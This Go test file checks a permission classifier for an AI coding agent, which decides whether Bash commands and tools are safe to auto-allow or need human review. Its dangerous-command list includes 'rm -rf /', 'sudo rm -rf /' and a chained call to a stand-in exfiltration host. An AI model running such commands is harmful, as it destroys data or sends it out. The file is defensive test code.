package experience

import (
	"testing"
	"time"

	"claude-manager/internal/store"
)

// TestClassifyPermission_ToolLevel: Read/Grep/Glob are always safe regardless
// of pattern; every other non-Bash tool always requires a human.
func TestClassifyPermission_ToolLevel(t *testing.T) {
	cases := []struct {
		tool    string
		pattern string
		safe    bool
	}{
		{"Read", "internal/**/*.go", true},
		{"Read", "/etc/shadow", true}, // Read never mutates, whatever the path
		{"Grep", "TODO", true},
		{"Glob", "**/*.ts", true},
		{"Edit", "internal/app.go", false},
		{"Write", "internal/new.go", false},
		{"McpTool", "some_tool", false},
		{"", "anything", false},
	}
	for _, c := range cases {
		if got := ClassifyPermission(c.tool, c.pattern); got != c.safe {
			t.Errorf("ClassifyPermission(%q, %q) = %v, want %v", c.tool, c.pattern, got, c.safe)
		}
	}
}

// TestClassifyPermission_BashCommands is the classifier's core test: at
// least 20 cases split across safe (whitelisted read-only commands) and
// dangerous (anything that must never be suggested for auto-allow, however
// often it is run) — LEARN-TASKS.md LN-04's own bar.
func TestClassifyPermission_BashCommands(t *testing.T) {
	safe := []string{
		"ls -la",
		"cat internal/app.go",
		"head -50 README.md",
		"tail -f app.log",
		"sed -n '1,5p' file.go",
		"grep -rn TODO .",
		"rg TODO",
		"find . -name '*.go'",
		"git status",
		"git status --short --branch",
		"git log -5",
		"git diff HEAD",
		"git show HEAD~1",
		"go build ./...",
		"go test ./...",
		"go vet ./...",
		"cargo check",
		"cargo build --release",
		"cargo test",
		"cargo clippy",
		"npm test",
		"npm run build",
		"ls && cat internal/app.go",
		"git status; git log -1",
	}
	for _, cmd := range safe {
		if !ClassifyPermission("Bash", cmd) {
			t.Errorf("ClassifyPermission(Bash, %q) = false, want true (safe)", cmd)
		}
	}

	dangerous := []string{
		"rm -rf /",
		"rm file.txt",
		"mv a.txt b.txt",
		"echo hi > file.txt",
		"echo hi >> file.txt",
		"curl http://example.com",
		"wget http://example.com",
		"ssh user@host",
		"sudo rm -rf /",
		"git push origin master",
		"git reset --hard",
		"git checkout -- .",
		"npm install --force",
		"cat file.txt && rm file.txt", // one safe segment, one dangerous
		"ls; rm -rf /tmp",
		"go test ./... && curl http://exfiltrate.example",
		"", // empty command is never safe by default
		"term some argument",     // unknown command: no whitelist match, not "safe by accident"
		"npm install left-pad",   // "npm" alone is not whitelisted, only test/run build
		"git clone https://x/y", // "git" alone is not whitelisted
	}
	for _, cmd := range dangerous {
		if ClassifyPermission("Bash", cmd) {
			t.Errorf("ClassifyPermission(Bash, %q) = true, want false (dangerous/unclassified)", cmd)
		}
	}
}

// TestClassifyPermission_RmSubstringFalsePositive guards the word-boundary
// matching specifically: a command that merely contains "rm" as part of a
// longer word (not the rm command) must not be rejected by that alone —
// though it still needs to clear the whitelist to be called safe.
func TestClassifyPermission_RmSubstringFalsePositive(t *testing.T) {
	// "term" contains "rm" as a substring but is not the rm command; it is
	// still unsafe because it matches no whitelist entry, not because of a
	// false "rm" match — so it must be caught by neither the dangerous
	// substring check texturing "term" as "rm", nor accidentally allowed.
	if classifyBashCommand("term") {
		t.Error("classifyBashCommand(\"term\") should be false: not whitelisted")
	}
	for _, re := range dangerousBashPatterns {
		if re.MatchString("term") && re.String() == `\brm\b` {
			t.Error(`\brm\b must not match "term" (word boundary)`)
		}
	}
}

func TestCandidates_SplitsSafeAndNeedsReview(t *testing.T) {
	now := time.Now()
	stats := []store.PermissionEventStat{
		// Frequent, consistently allowed, whitelisted Bash — safe.
		{Tool: "Bash", Pattern: "go test ./...", Count: 5, AllowCount: 5, DenyCount: 0, FirstSeen: now, LastSeen: now},
		// Frequent, consistently allowed, but Edit — needs review.
		{Tool: "Edit", Pattern: "internal/*.go", Count: 4, AllowCount: 4, DenyCount: 0, FirstSeen: now, LastSeen: now},
		// Frequent, consistently allowed, but dangerous Bash — needs review, never safe.
		{Tool: "Bash", Pattern: "git push origin master", Count: 3, AllowCount: 3, DenyCount: 0, FirstSeen: now, LastSeen: now},
		// Too few occurrences — dropped entirely.
		{Tool: "Bash", Pattern: "go vet ./...", Count: 1, AllowCount: 1, DenyCount: 0, FirstSeen: now, LastSeen: now},
		// Denied more than allowed — dropped entirely, even though whitelisted.
		{Tool: "Bash", Pattern: "cat secrets.env", Count: 4, AllowCount: 1, DenyCount: 3, FirstSeen: now, LastSeen: now},
	}

	safe, needsReview := Candidates(stats, MinPermissionCount)

	if len(safe) != 1 || safe[0].Pattern != "go test ./..." {
		t.Fatalf("safe candidates = %+v, want exactly [go test ./...]", safe)
	}
	if !safe[0].Safe {
		t.Error("safe candidate must have Safe=true")
	}

	if len(needsReview) != 2 {
		t.Fatalf("needsReview = %+v, want 2 entries", needsReview)
	}
	for _, c := range needsReview {
		if c.Safe {
			t.Errorf("needsReview candidate %+v must have Safe=false", c)
		}
	}
}

func TestCandidates_EmptyInput(t *testing.T) {
	safe, needsReview := Candidates(nil, MinPermissionCount)
	if len(safe) != 0 || len(needsReview) != 0 {
		t.Errorf("expected no candidates for empty input, got safe=%+v needsReview=%+v", safe, needsReview)
	}
}
